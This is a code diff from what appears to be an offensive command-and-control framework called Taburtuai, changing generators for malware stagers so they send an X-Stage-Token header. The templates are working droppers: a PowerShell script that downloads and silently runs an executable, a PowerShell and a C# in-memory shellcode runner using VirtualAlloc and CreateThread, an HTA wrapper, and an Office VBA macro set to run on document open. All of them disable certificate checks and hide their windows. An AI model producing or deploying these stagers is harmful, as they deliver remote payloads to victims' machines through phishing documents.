@@ -14,13 +14,15 @@ import (
 // ── delivery format generators ────────────────────────────────────────────────
 
 // templatePS1Drop generates a PowerShell stager that downloads the staged
-// payload directly from stageURL, drops it to %TEMP%, and executes it.
-// No binary is embedded — the stage server decrypts and serves plaintext bytes.
-func templatePS1Drop(stageURL string) string {
+// payload using X-Stage-Token header (not URL path), drops it to %TEMP%, and
+// executes it.  No binary is embedded — the stage server decrypts and serves
+// plaintext bytes.
+func templatePS1Drop(endpoint, token string) string {
 	return fmt.Sprintf(`$ErrorActionPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 $wc = New-Object Net.WebClient
 $wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+$wc.Headers['X-Stage-Token'] = '%s'
 $p = [IO.Path]::Combine($env:TEMP, [IO.Path]::GetRandomFileName() + '.exe')
 try { $wc.DownloadFile('%s', $p) } catch { exit }
 if (-not (Test-Path $p) -or (Get-Item $p).Length -eq 0) { exit }
@@ -29,7 +31,7 @@ $s.FileName = $p
 $s.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden
 $s.CreateNoWindow = $true
 [Diagnostics.Process]::Start($s) | Out-Null
-`, stageURL)
+`, token, endpoint)
 }
 
 // templatePS1Embed drops a pre-compiled EXE (embedded as base64) to %TEMP%
@@ -62,12 +64,12 @@ $s.CreateNoWindow = $true
 
 // templatePS1Shellcode generates a PowerShell stager that downloads raw shellcode
 // from the C2 and executes it in-process via VirtualAlloc + CreateThread PInvoke.
-// The payload at stageURL must be raw shellcode (not a PE).
-func templatePS1Shellcode(stageURL string) string {
+func templatePS1Shellcode(endpoint, token string) string {
 	return fmt.Sprintf(`# Taburtuai Stager — PS1 in-memory shellcode runner
 $ErrorActionPreference = 'SilentlyContinue'
 $wc = New-Object System.Net.WebClient
 $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+$wc.Headers.Add('X-Stage-Token','%s')
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 $sc = $wc.DownloadData('%s')
 if ($sc.Length -eq 0) { exit }
@@ -81,14 +83,14 @@ $mem = $k32::VirtualAlloc([IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
 [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
 $h = $k32::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 $k32::WaitForSingleObject($h, -1) | Out-Null
-`, stageURL)
+`, token, endpoint)
 }
 
 // templateHTA generates an HTML Application (.hta) that runs the PS1 stager.
-func templateHTA(stageURL string, stagerEXE []byte) string {
+func templateHTA(endpoint, token string, stagerEXE []byte) string {
 	var ps1 string
-	if stageURL != "" {
-		ps1 = templatePS1Drop(stageURL)
+	if endpoint != "" {
+		ps1 = templatePS1Drop(endpoint, token)
 	} else {
 		ps1 = templatePS1Embed(stagerEXE)
 	}
@@ -117,7 +119,7 @@ Self.Close
 }
 
 // templateVBA generates an Office VBA macro that downloads and runs the stager.
-func templateVBA(stageURL string) string {
+func templateVBA(endpoint, token string) string {
 	return fmt.Sprintf(`' Taburtuai Stager — VBA macro dropper
 ' Insert into: Developer > Visual Basic > Insert Module
 ' Trigger: Auto_Open / Workbook_Open / Document_Open
@@ -136,6 +138,7 @@ End Sub
 
 Private Sub RunStager()
     Dim url As String : url = "%s"
+    Dim tok As String : tok = "%s"
     Dim tmp As String
     tmp = Environ("TEMP") & "\" & "upd" & Format(Now(), "HHMMSS") & ".exe"
 
@@ -143,6 +146,7 @@ Private Sub RunStager()
     Dim xhr As Object
     Set xhr = CreateObject("MSXML2.XMLHTTP")
     xhr.Open "GET", url, False
+    xhr.setRequestHeader "X-Stage-Token", tok
     xhr.Send
 
     If xhr.Status = 200 Then
@@ -161,12 +165,11 @@ Private Sub RunStager()
         wsh.Run Chr(34) & tmp & Chr(34), 0, False
     End If
 End Sub
-`, stageURL)
+`, endpoint, token)
 }
 
 // templateCS generates C# source code that runs shellcode via PInvoke.
-// The payload at stageURL must be raw shellcode.
-func templateCS(stageURL string) string {
+func templateCS(endpoint, token string) string {
 	return fmt.Sprintf(`// Taburtuai Stager — C# shellcode runner
 // Compile: csc /unsafe /out:stager.exe stager.cs
 // Requires: .NET Framework 4.0+
@@ -183,6 +186,7 @@ class Program {
         ServicePointManager.ServerCertificateValidationCallback += (s, c, ch, e) => true;
         var wc = new WebClient();
         wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+        wc.Headers.Add("X-Stage-Token", "%s");
         byte[] sc;
         try { sc = wc.DownloadData("%s"); } catch { return; }
         if (sc.Length == 0) return;
@@ -192,7 +196,7 @@ class Program {
         WaitForSingleObject(t, -1);
     }
 }
-`, stageURL)
+`, token, endpoint)
 }
 
 // ── ClickFix / social engineering templates ───────────────────────────────────
